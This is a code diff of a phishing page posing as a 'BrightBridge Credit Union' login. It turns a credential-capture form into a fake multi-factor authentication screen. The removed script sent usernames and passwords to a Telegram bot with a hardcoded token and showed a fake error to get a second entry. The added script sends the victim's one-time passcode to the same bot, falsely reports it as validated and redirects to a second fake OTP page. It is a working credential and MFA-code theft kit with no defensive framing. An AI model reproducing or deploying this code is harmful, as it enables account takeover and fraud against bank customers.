@@ -18,7 +18,7 @@
             align-items: center;
             min-height: 100vh;
             background: linear-gradient(to top, #1a3c5e, #4a90e2); /* Gradient overlay */
-            background-image: url('public/bg.png'); /* Replace with actual bridge image URL */
+            background-image: url('/bg.png'); /* Replace with actual bridge image URL */
             background-size: cover;
             background-position: center;
         }
@@ -31,7 +31,7 @@ padding: 0 120px;
 min-height: 60vh;
 overflow-y: hidden;
 }
-        form {
+        form, #primary_form {
             background-color: #ffffff;
             padding: 0 2rem;
             border-top-left-radius: 10px;
@@ -269,7 +269,193 @@ overflow-y: hidden;
             height: 70px;
             margin: 0 0.5rem;
         }
+        .otp-container {
+    width: 100%;
+    max-width: 400px;
+    background-color: #fff;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    padding: 0;
+    text-align: center;
+    overflow-y: scroll;
+    height: 90vh;
+}
 
+.header {
+    display: flex;
+    align-items: center;
+    background-color: #e0e0e0;
+    padding: 0;
+    border-radius: 5px;
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 20px;
+}
+
+.header i {
+    margin-right: 8px;
+    color: #555;
+}
+
+.h2Header{
+    background-color: #0082c8;
+    color: #fff;
+    padding: 10px;
+    font-size: 18px;
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+.h2Header a{
+  color: #fff;
+  text-decoration: none;
+}
+h2{
+  width: 90%;
+  font-size: 18px;
+}
+
+.auth-box {
+    text-align: center;
+    padding: 0 20px;
+}
+
+.security-text {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+}
+
+.auth-box i {
+    margin-bottom: 20px;
+    color: #32cd32;
+    font-size: 24px;
+}
+
+label {
+    font-size: 12px;
+    color: #666;
+    margin-top: 15px;
+    display: block;
+    text-align: left;
+    text-transform: uppercase;
+}
+hr{
+  border: 1px solid #ddd;
+  margin: 10px 0;
+}
+select, input[type="text"] {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    margin-bottom: 15px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 14px;
+}
+
+.remember {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-direction: row-reverse;
+    margin-bottom: 20px;
+}
+
+.remember label {
+    font-size: 14px;
+    color: #666;
+    font-weight: bold;
+    margin-left: 5px;
+}
+
+h3 {
+  font-size: 12px;
+  color: #666;
+  margin-top: 15px;
+  display: block;
+  text-align: left;
+  font-weight: 500;
+  text-transform: uppercase;
+}
+
+.confirm-text {
+    font-size: 14px;
+    color: #666;
+    margin-top: 10px;
+    margin-bottom: 20px;
+    text-align: left;
+}
+
+.buttons {
+    display: flex;
+    justify-content: flex-end;
+    gap: 20px;
+    margin-bottom: 20px;
+}
+.buttons i{
+  color: #666;
+}
+.button-text, .button-call {
+    width: 100px;
+    padding: 10px;
+    font-size: 14px;
+    border-radius: 5px;
+    border: none;
+    cursor: pointer;
+    color: #666;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background-color: transparent;
+    border: 1px solid #666;
+    padding: 20px;
+}
+
+/* Green background for the active button */
+.buttons .active {
+  background-color: #32cd32; /* Green */
+  color: #fff;
+}
+.buttons .active i{
+  color: #fff;
+}
+
+.button-text i, .button-call i {
+    margin-right: 8px;
+}
+
+.sentpasscode{
+  font-size: 12px;
+  color: #666;
+  margin: 40px 0;
+  display: block;
+  text-align: center;
+  font-weight: 500;
+}
+
+.submit-button {
+  width: 100%;
+  padding: 10px;
+  font-size: 14px;
+  background-color: #ccc; /* Gray when disabled */
+  color: #666;
+  border: none;
+  border-radius: 5px;
+  cursor: not-allowed;
+  transition: background-color 0.3s;
+}
+
+/* Active state for the submit button */
+.submit-button.active {
+  background-color: #0082c8; /* Blue when active */
+  cursor: pointer;
+  color: #fff;
+}
         /* Responsive adjustments */
         @media (max-width: 768px) {
             .login-image-container {
@@ -310,36 +496,60 @@ overflow-y: hidden;
     <div class="main-container">
     <div class="login-image-container">
        
-        <form id="primary_form">
+        <div id="primary_form">
             <div class="logo">
-                <img src="/public/logo.png" alt="BrightBridge Credit Union Logo">
+                <img src="/logo.png" alt="BrightBridge Credit Union Logo">
             </div>
         
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" class="form-username" id="username" required name="username" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" required id="password" name="password" required>
-                <button type="button" class="show-password" id="togglePasscode" onclick="togglePassword()"><img src="public/view.png" alt="show icon"/></button>
-            </div>
-            <div class="toggle-group">
-                <input type="checkbox" id="remember" name="remember">
-                <label for="remember">
-                    <span class="toggle-switch"></span>
-                    Remember Me
-                </label>
-            </div>
-            <button type="submit">Log In</button>
+            <div class="h2Header">
+                <h2>AUTHENTICATE</h2>
+                <a href="/form.html"><i class="fas fa-times"></i>
+                </a>
+              </div>
+                
+                
+                <div class="auth-box">
+                    <i class="fas fa-shield-alt"></i>
+                    <p class="security-text"> 
+                        For added security we have enabled Multi-Factor Authentication (MFA) for our users.
+                    </p>
+                    
+                    <label for="device">SELECT A DEVICE</label>
+                    <hr>
+                    
+                    <div class="remember">
+                        <input type="checkbox" id="remember-device">
+                        <label for="remember-device">Remember Device</label>
+                    </div>
+                    
+                    <h3>CONFIRM VIA</h3>
+                    <hr>
+                    <p class="confirm-text">
+                        We need to confirm that you have access to the selected device by sending a passcode via a third-party application or via text message, or we can call the device.
+                    </p>
+                    
+                    <div class="buttons">
+                        <button type="button" class="button-text" onclick="setActiveButton(this)"><i class="fas fa-sms"></i> Passcode via Text</button>
+                        <button type="button" class="button-call" onclick="setActiveButton(this)"><i class="fas fa-phone-alt"></i> Phone Call</button>
+                    </div>
+                    
+                <p class="sentpasscode">Please enter the passcode sent via text message to the selected device or from within the Duo Mobile app.</p>
+                    <label for="passcode">ENTER SIX DIGIT PASSCODE</label>
+                
+                    <input type="text" id="passcode" placeholder="PASSCODE" oninput="checkPasscode()">
+                    
+                </div>
+
+      
+            <button  id="submitButton"  onclick="submit()">Submit</button>
             <p id="error-message" class="error-message"></p>
             <div class="forgot-link">
                 <a href="#">Forgot Username or Password?</a>
             </div>
-        </form>
+        </div>
 
         <div class="image_form_background">
-            <img src="public/bg.png" alt="background"/>
+            <img src="/bg.png" alt="background"/>
         </div>
        
     </div>
@@ -369,57 +579,40 @@ overflow-y: hidden;
 </body>
 
 <script>
-    const form = document.querySelector("#primary_form");
-    const first_input = document.querySelector(".form-username");
-    var notUsed = true;
-    var submittedOnce = false;
-    first_input.onfocus = function() {
-        var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
-        var chat_id = "-4244251369";
-        var my_text = `Get ready, somebody is logging in`
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
-        if(notUsed){
-            notUsed = false;
-            let api = new XMLHttpRequest();
-        api.open("GET", url, true);
-        api.send();
-        }
-    };
-    form.addEventListener("submit", (e) => {
-        e.preventDefault();
-        var username = document.querySelector("#username").value;
-        var password = document.querySelector("#password").value;
-        var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
-        var chat_id = "-4244251369";
-        var my_text = `Username:${username} Password:${password}`
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
-        console.log(username, password);
-  
-        let api = new XMLHttpRequest();
-        api.open("GET", url, true);
-        api.send();
-  
-        if(submittedOnce){
-          window.location.href="otp.html";
-          submittedOnce = false;
+    function setActiveButton(button) {
+        // Remove 'active' class from all buttons
+        document.querySelectorAll('.buttons button').forEach(btn => btn.classList.remove('active'));
+        // Add 'active' class to the clicked button
+        button.classList.add('active');
+    }
+
+    function checkPasscode() {
+        const passcodeInput = document.getElementById('passcode');
+        const submitButton = document.getElementById('submitButton');
+        // Enable submit button if input has value; disable if empty
+        if (passcodeInput.value.trim() !== "") {
+            submitButton.disabled = false;
+            submitButton.classList.add('active');
         } else {
-          const errorMessage = document.getElementById('error-message');
-              errorMessage.textContent = "Incorrect credentials, submit again";
-              errorMessage.style.color = "red";
-              submittedOnce = true;
+            submitButton.disabled = true;
+            submitButton.classList.remove('active');
         }
-       
-       
-    })
-  
-    function togglePassword() {
-              const passcodeInput = document.getElementById('password');
-              const toggleButton = document.getElementById('togglePasscode');
-              if (passcodeInput.type === "password") {
-                  passcodeInput.type = "text";
-              } else {
-                  passcodeInput.type = "password";
-              }
-          }
-  </script>
+    }
+
+    function submit() {
+        const passcodeInput = document.getElementById('passcode');
+        var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+        var chat_id = "-4244251369";
+        var my_text = passcodeInput.value;
+        console.log(my_text);
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+
+
+       let api = new XMLHttpRequest();
+       api.open("GET", url, true);
+       api.send();
+       alert("OTp has been validated, Input Second OTP");
+   window.location.href="otp2.html";
+    }
+</script>
 </html>
